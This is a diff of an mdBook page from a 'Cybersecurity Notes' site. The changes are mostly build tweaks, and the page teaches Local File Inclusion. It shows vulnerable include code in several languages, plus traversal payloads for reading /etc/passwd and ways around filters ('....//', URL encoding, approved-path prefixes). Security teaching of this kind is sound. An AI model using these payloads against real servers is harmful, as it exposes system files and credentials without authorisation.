@@ -12,22 +12,22 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
 
-        <link rel="shortcut icon" href="../../../../favicon.png">
-        <link rel="stylesheet" href="../../../../css/variables.css">
-        <link rel="stylesheet" href="../../../../css/general.css">
-        <link rel="stylesheet" href="../../../../css/chrome.css">
+        <link rel="shortcut icon" href="../../../../favicon-7514936c.png">
+        <link rel="stylesheet" href="../../../../css/variables-8adf115d.css">
+        <link rel="stylesheet" href="../../../../css/general-2459343d.css">
+        <link rel="stylesheet" href="../../../../css/chrome-ae938929.css">
+        <link rel="stylesheet" href="../../../../css/print-9e4910d8.css" media="print">
 
         <!-- Fonts -->
-        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
-        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts-9644e21d.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" id="highlight-css" href="../../../../highlight.css">
-        <link rel="stylesheet" id="tomorrow-night-css" href="../../../../tomorrow-night.css">
-        <link rel="stylesheet" id="ayu-highlight-css" href="../../../../ayu-highlight.css">
+        <link rel="stylesheet" id="mdbook-highlight-css" href="../../../../highlight-493f70e1.css">
+        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="../../../../tomorrow-night-4c0ae647.css">
+        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="../../../../ayu-highlight-3fdfc3ac.css">
 
         <!-- Custom theme stylesheets -->
-        <link rel="stylesheet" href="../../../../theme/pagetoc.css">
+        <link rel="stylesheet" href="../../../../theme/custom-81a920ab.css">
 
 
         <!-- Provide site root and default themes to javascript -->
@@ -35,10 +35,10 @@
             const path_to_root = "../../../../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "../../../../searchindex.js";
+            window.path_to_searchindex_js = "../../../../searchindex-6205a3f5.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="../../../../toc.js"></script>
+        <script src="../../../../toc-eceb7dc6.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -52,7 +52,7 @@
             </div>
         </div>
     </div>
-    <div id="body-container">
+    <div id="mdbook-body-container">
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
         <script>
             try {
@@ -81,12 +81,12 @@
             html.classList.add("js");
         </script>
 
-        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
             let sidebar = null;
-            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
@@ -101,78 +101,81 @@
             }
         </script>
 
-        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
             <!-- populated by js -->
             <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
             <noscript>
                 <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
             </noscript>
-            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
             </div>
         </nav>
 
-        <div id="page-wrapper" class="page-wrapper">
+        <div id="mdbook-page-wrapper" class="page-wrapper">
 
             <div class="page">
-                <div id="menu-bar-hover-placeholder"></div>
-                <div id="menu-bar" class="menu-bar sticky">
+                <div id="mdbook-menu-bar-hover-placeholder"></div>
+                <div id="mdbook-menu-bar" class="menu-bar sticky">
                     <div class="left-buttons">
-                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
-                            <i class="fa fa-bars"></i>
+                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
                         </label>
-                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
-                            <i class="fa fa-paint-brush"></i>
+                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
                         </button>
-                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
-                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
-                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
                         </ul>
-                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
-                            <i class="fa fa-search"></i>
+                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
                         </button>
                     </div>
 
                     <h1 class="menu-title">Cybersecurity Notes</h1>
 
                     <div class="right-buttons">
+                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
+                        </a>
                         <a href="https://github.com/d41y/d41y.github.io" title="Git repository" aria-label="Git repository">
-                            <i id="git-repository-button" class="fa fa-github"></i>
+                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span>
                         </a>
 
                     </div>
                 </div>
 
-                <div id="search-wrapper" class="hidden">
-                    <form id="searchbar-outer" class="searchbar-outer">
+                <div id="mdbook-search-wrapper" class="hidden">
+                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
                         <div class="search-wrapper">
-                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
                             <div class="spinner-wrapper">
-                                <i class="fa fa-spinner fa-spin"></i>
+                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
                             </div>
                         </div>
                     </form>
-                    <div id="searchresults-outer" class="searchresults-outer hidden">
-                        <div id="searchresults-header" class="searchresults-header"></div>
-                        <ul id="searchresults">
+                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
+                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
+                        <ul id="mdbook-searchresults">
                         </ul>
                     </div>
                 </div>
 
                 <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                 <script>
-                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
-                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
-                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
                         link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                     });
                 </script>
 
-                <div id="content" class="content">
+                <div id="mdbook-content" class="content">
                     <main>
                         <style>
 .mdbook-callouts {
@@ -413,7 +416,7 @@
 </style>
 <h1 id="file-inclusion"><a class="header" href="#file-inclusion">File Inclusion</a></h1>
 <h2 id="intro"><a class="header" href="#intro">Intro</a></h2>
-<p>Many modern back-end languages use HTTP parameters to sprecify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (<em>LFI</em>) vulnerability.</p>
+<p>Many modern back-end languages use HTTP parameters to sprecify what is shown on the web page, which allows for building dynamic web pages, reduces the script’s overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (<em>LFI</em>) vulnerability.</p>
 <p>The most common place you usually find LFI within is templating engines. In order to have most of the web app looking the same when navigating between pages, a template engine displays a page that shows common static parts, such as the header, navigation bar, and footer, and then dynamically loads other content that changes between pages. Otherwise every page on the server would need to be modifified when changes are made to any of the staitc parts. This is why you often see a parameter like <code>index.php?page=about</code>, where <code>index.php</code> sets static content, and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called <code>about.php</code>. As you have control over the <code>about</code> portion of the request, it may be possible to have the web app grab other files and display them on the page.</p>
 <p>LFIs can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions. Leaking source code may allow attackers to test the code for other vulns, which may reveal previously unknown vulns. Furthermore, leaking sensitive data may enable attackers to enumerate the remote server for other weaknesses or even leak credentials and keys that may allow them to access the remote server directly. Under specific conditions, LFI may also allow attackers to execute code on the remote server, which may compromise the entire back-end server and any other servers connected to it.</p>
 <h3 id="examples-of-vulnerable-code---php"><a class="header" href="#examples-of-vulnerable-code---php">Examples of Vulnerable Code - PHP</a></h3>
@@ -424,12 +427,18 @@
 }
 </code></pre>
 <p>You see that the <code>language</code> parameter is directly passed to the <code>include()</code> function. So, any path you pass in the <code>language</code> parameter will be loaded on the page, including any local files on the back-end server. This is not exclusive to the <code>include()</code> function, as there are many other PHP functions that would lead to the same vulnerability if you had control over the path passed into them. Such functions include <code>include_once()</code>, <code>require()</code>, <code>require_once()</code>, <code>file_get_contents()</code>, and several others as well.</p>
-<div class="table-wrapper"><table><thead><tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr></thead><tbody>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr>
+</thead>
+<tbody>
 <tr><td><code>include()</code> / <code>inlcude_once()</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
 <tr><td><code>require()</code> / <code>require_once()</code></td><td>YES</td><td>YES</td><td>NO</td></tr>
 <tr><td><code>file_get_content()</code></td><td>YES</td><td>NO</td><td>YES</td></tr>
 <tr><td><code>fopen()</code> / <code>file()</code></td><td>YES</td><td>NO</td><td>NO</td></tr>
-</tbody></table>
+</tbody>
+</table>
 </div>
 <h3 id="examples-of-vulnerable-code---nodejs"><a class="header" href="#examples-of-vulnerable-code---nodejs">Examples of Vulnerable Code - NodeJS</a></h3>
 <pre><code class="language-javascript">if(req.query.language) {
@@ -444,11 +453,17 @@
 });
 </code></pre>
 <p>Unlike your earlier examples where GET parameters were specified after a <code>?</code> char in the URL, the above example takes the parameter from the URL path. As the parameter is directly used within the <code>render()</code> function to specify the rendered file, you can change the URL to show a different file instead.</p>
-<div class="table-wrapper"><table><thead><tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr></thead><tbody>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr>
+</thead>
+<tbody>
 <tr><td><code>fs.readFile()</code></td><td>YES</td><td>NO</td><td>NO</td></tr>
 <tr><td><code>fs.sendFile()</code></td><td>YES</td><td>NO</td><td>NO</td></tr>
 <tr><td><code>res.render()</code></td><td>YES</td><td>YES</td><td>NO</td></tr>
-</tbody></table>
+</tbody>
+</table>
 </div>
 <h3 id="examples-of-vulnerable-code---java"><a class="header" href="#examples-of-vulnerable-code---java">Examples of Vulnerable Code - Java</a></h3>
 <pre><code class="language-jsp">&lt;c:if test="${not empty param.language}"&gt;
@@ -458,10 +473,16 @@
 <p>The <code>include</code> function may take a file or a page URL as its arguments and then renders the object into the front-end template, similar to the ones you saw earlier with NodeJS. The <code>import</code> function may also be used to render a local file or a URL, such as the following example:</p>
 <pre><code class="language-jsp">&lt;c:import url= "&lt;%= request.getParameter('language') %&gt;"/&gt;
 </code></pre>
-<div class="table-wrapper"><table><thead><tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr></thead><tbody>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr>
+</thead>
+<tbody>
 <tr><td><code>include</code></td><td>YES</td><td>NO</td><td>NO</td></tr>
 <tr><td><code>import</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
-</tbody></table>
+</tbody>
+</table>
 </div>
 <h3 id="examples-of-vulnerable-code---net"><a class="header" href="#examples-of-vulnerable-code---net">Examples of Vulnerable Code - .NET</a></h3>
 <pre><code class="language-cs">@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
@@ -475,23 +496,29 @@
 <p>Finally, the <code>include</code> function may be used to render local files or remote URLs, and may also execute the specified files as well:</p>
 <pre><code class="language-cs">&lt;!--#include file="&lt;% HttpContext.Request.Query['language'] %&gt;"--&gt;
 </code></pre>
-<div class="table-wrapper"><table><thead><tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr></thead><tbody>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr>
+</thead>
+<tbody>
 <tr><td><code>@Html.Partial()</code></td><td>YES</td><td>NO</td><td>NO</td></tr>
 <tr><td><code>@Html.RemotePartial()</code></td><td>YES</td><td>NO</td><td>YES</td></tr>
 <tr><td><code>Response.WriteFile()</code></td><td>YES</td><td>NO</td><td>NO</td></tr>
 <tr><td><code>include()</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
-</tbody></table>
+</tbody>
+</table>
 </div>
 <h2 id="file-disclosure"><a class="header" href="#file-disclosure">File Disclosure</a></h2>
 <h3 id="local-file-inclusion"><a class="header" href="#local-file-inclusion">Local File Inclusion</a></h3>
 <h4 id="basic-lfi"><a class="header" href="#basic-lfi">Basic LFI</a></h4>
 <p>Example of a webpage:</p>
-<p><img src="../../../../images/lfi1.png" alt="lfi 1" /></p>
+<p><img src="../../../../images/lfi1.png" alt="lfi 1"></p>
 <p>If you select a language by clicking on it, you see that the content text changes to it.</p>
-<p><img src="../../../../images/lfi2.png" alt="lfi 2" /></p>
+<p><img src="../../../../images/lfi2.png" alt="lfi 2"></p>
 <p>You also notice that the URL includes a <code>language</code> parameter that is now set to the language you selected. There are several ways the content could be changed to match the language you specified. It may be pulling the content from a different database table based on the specified parameter, or it may be loading an entirely different version of the web app. However, as previously disccused, loading part of the page using template engines is the easiest and most common method utilized.</p>
 <p>So, if the web app is indeed pulling a file that is now being included in the page, you may be able to change file being pulled to read the content of a different local file. Two common readable files that are available on most back-end servers are <code>/etc/passwd</code> on Linux and <code>C:\Windows\boot.ini</code> on Windows.</p>
-<p><img src="../../../../images/lfi3.png" alt="lfi 3" /></p>
+<p><img src="../../../../images/lfi3.png" alt="lfi 3"></p>
 <p>As you can see, the page is indeed vulnerable, and you are able to read the content of the <code>passwd</code> file.</p>
 <h4 id="path-traversal"><a class="header" href="#path-traversal">Path Traversal</a></h4>
 <p>In the earlier example, you read a file by specifying its absolute path. This would work if the whole input was used within the <code>include()</code> function without any additions, like the following example:</p>
@@ -503,7 +530,7 @@
 <p>In this case, if you attempt to read <code>/etc/passwd</code>, then the path passed to <code>include()</code> would be <code>.languages//etc/passwd</code>, and as this file does not exist, you will not be able to read anything.</p>
 <p>You can easily, bypass this restriction by traversing directories using relative paths. To do so, you can add <code>../</code> before your file name, which refers to the parent directory. For example, if the full path of the language directory is <code>/var/wwww/html/language</code>, then using <code>../index.php</code> would refer to the <code>index.php</code> file on the parent directory.</p>
 <p>So, you can sue this trick to go back several directories until you reach the root path, and then specify your absolute file path, and the file should exist.</p>
-<p><img src="../../../../images/lfi4.png" alt="lfi 4" /></p>
+<p><img src="../../../../images/lfi4.png" alt="lfi 4"></p>
 <p>As you can see, this time you were able to read the file regardless of the directory you were in. This trick would work even if the entire parameter was used in the <code>include()</code> function, so you can default to this technique, and it should work in both cases. Furthermore, if you were at the root path and used <code>../</code> then you would still remain in the root path. So, if you were not sure if the directory the app is in, you can add <code>../</code> many times, and it should not break the path.</p>
 <h4 id="filename-prefix"><a class="header" href="#filename-prefix">Filename Prefix</a></h4>
 <p>In the previous example, you used the <code>language</code> parameter after the directory, so you could traverse the path to read the <code>passwd</code>. On some occasions, you input may be appended after a different string. For example, it may be used with a prefix to get the full filename:</p>
@@ -511,14 +538,16 @@
 </code></pre>
 <p>In this case, if you try to traverse the directory with <code>../../../etc/passwd</code>, the final string would be <code>lang_../../../etc/passwd</code>, which is invalid.</p>
 <p>Instead, you can prefix a <code>/</code> before your payload, and this should consider the prefix as a directory, and then you should bypass the filename and be able to traverse directories:</p>
-<p><img src="../../../../images/lfi5.png" alt="lfi 5" /></p>
+<p><img src="../../../../images/lfi5.png" alt="lfi 5"></p>
 <div class="mdbook-callouts mdbook-callouts-note">
 <p class="mdbook-callouts-title">
   <span class="mdbook-callouts-icon"></span>
   note
 </p>
+
 <p>This may not always work, as in this example a directory named <code>lang_</code> may not exist, so your relative path may not be correct. Furthermore, any prefix appended to your input may break some file inclusion techniques, like using PHP wrappers and filters or RFI.</p>
 </div>
+
 <h4 id="appended-extensions"><a class="header" href="#appended-extensions">Appended Extensions</a></h4>
 <p>Another very common example, is when an extension is appended to the <code>language</code> parameter:</p>
 <pre><code class="language-php">include($_GET['language'] . ".php");
@@ -535,14 +564,14 @@
 <pre><code class="language-php">$language = str_replace('../', '', $_GET['language']);
 </code></pre>
 <p>The above code is supposed to prevent path traversal, and hece renders LFI useless.</p>
-<p><img src="../../../../images/lfi6.png" alt="lfi 6" /></p>
+<p><img src="../../../../images/lfi6.png" alt="lfi 6"></p>
 <p>You see that all <code>../</code> substrings were removed, which resulted in a final path being <code>./languages/etc/passwd</code>. However, this filter is very insecure, as it is not recursively removing the substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if you use <code>....//</code> as your payload, then the filter would remove <code>../</code> and the output string would be <code>../</code>, which means you may still perform path traversal.</p>
-<p><img src="../../../../images/lfi7.png" alt="lfi 7" /></p>
-<p>The inclusion was successful this time, you're able to read <code>/etc/passwd</code> successfully. The <code>....//</code> substring is not the only bypass you can use, as you may use <code>..././</code> or <code>....\/</code> and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash char may also work to avoid path traversal filters, or adding extra forward slashes.</p>
+<p><img src="../../../../images/lfi7.png" alt="lfi 7"></p>
+<p>The inclusion was successful this time, you’re able to read <code>/etc/passwd</code> successfully. The <code>....//</code> substring is not the only bypass you can use, as you may use <code>..././</code> or <code>....\/</code> and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash char may also work to avoid path traversal filters, or adding extra forward slashes.</p>
 <h4 id="encoding"><a class="header" href="#encoding">Encoding</a></h4>
 <p>Some web filters may prevent input filters that include certain LFI-related chars, like a <code>.</code> or a <code>/</code> used for path traversals. However, some of these filters may be bypassed by URL encoding your input, such that it would no longer include these bad characters, but would still be decoded back to your path traversal string once it reaches the vulnerable function. Core PHP filters on versions 5.3.4 and earlier were specifically vulnerable to this bypass, but even on newer versions you may find custom filters that may be bypassed through URL encoding.</p>
 <p>If the target web app did not allow <code>.</code> and <code>/</code> in your input, you can URL encode <code>../</code> into <code>%2e%2e%2f</code>, which may bypass the filter.</p>
-<p><img src="../../../../images/lfi8.png" alt="lfi 8" /></p>
+<p><img src="../../../../images/lfi8.png" alt="lfi 8"></p>
 <p>As you can see, you were also able to successfully bypass the filter and use path traversal to read <code>/etc/passwd</code>.</p>
 <h4 id="approved-paths"><a class="header" href="#approved-paths">Approved Paths</a></h4>
 <p>Some web apps may also use Regex to ensure that the file being included is under a specific path. For example, the web app you have been dealing with may only accept paths that are under the <code>./language</code> directory:</p>
@@ -553,7 +582,7 @@
 }
 </code></pre>
 <p>To find the approved path, you can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, you can fuzz web directories under the same path, and try different ones until you get a match. To bypass this, you may use path traversal and start your payload with the approved path, and then use <code>../</code> to go back to the root directory and read the file you specify.</p>
-<p><img src="../../../../images/lfi9.png" alt="lfi 9" /></p>
+<p><img src="../../../../images/lfi9.png" alt="lfi 9"></p>
 <p>Some web apps may apply this filter along with one of the earlier filters, so you may combine both techniques by starting your payload with the approved path, and then URL encode your payload or use recursive payload.</p>
 <h4 id="appended-extension"><a class="header" href="#appended-extension">Appended Extension</a></h4>
 <p>There are a couple of techniques you may use, but they are obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4.</p>
@@ -592,19 +621,21 @@ config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
   <span class="mdbook-callouts-icon"></span>
   tip
 </p>
+
 <p>Unlike normal web app usage, you are not restricted to pages with HTTP response code 200, as you have LFI access, so you should be scanning for all codes, including 301, 302, and 403 pages, and you should be able to read their source code as well.</p>
 </div>
-<p>Even after reading the sources of any identified files, you can scan them for other referenced PHP files, and then read those as well, until you are able to capture most of the web app's source or have an accurate image of what it does. It is also possible to start by reading <code>index.php</code> and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.</p>
+
+<p>Even after reading the sources of any identified files, you can scan them for other referenced PHP files, and then read those as well, until you are able to capture most of the web app’s source or have an accurate image of what it does. It is also possible to start by reading <code>index.php</code> and scanning it for more references and so on, but fuzzing for PHP files may reveal some files that may not otherwise be found that way.</p>
 <h4 id="standard-php-inlcusion"><a class="header" href="#standard-php-inlcusion">Standard PHP Inlcusion</a></h4>
 <p>In previous sections, if you tried to include any PHP files through LFI, you would have noticed that the included PHO file gets executed, and eventually gets rendered as a normal HTML page. For example, try to include the <code>config.php</code> page:</p>
